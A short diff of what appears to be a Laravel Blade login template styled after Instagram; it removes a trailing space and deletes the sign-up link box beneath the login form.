@@ -25,7 +25,7 @@
                   <div class="header">
                       <div class="m-auto">
                     <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
-                </div> 
+                </div>
                 </div><!-- Header end -->
                   <div class="form-wrap">
                     <form method="POST" action="{{ route('login') }}">
@@ -80,10 +80,6 @@
                     </form>
                   </div> <!-- Form-wrap end -->
                 </div> <!-- Login-box end -->
-
-                <div class="login-box">
-                  <p class="text">Don't have an account?<a href="#">Sign up</a></p>
-                </div> <!-- Signup-box end -->
 
                 <div class="app">
                   <p>Get the app.</p>
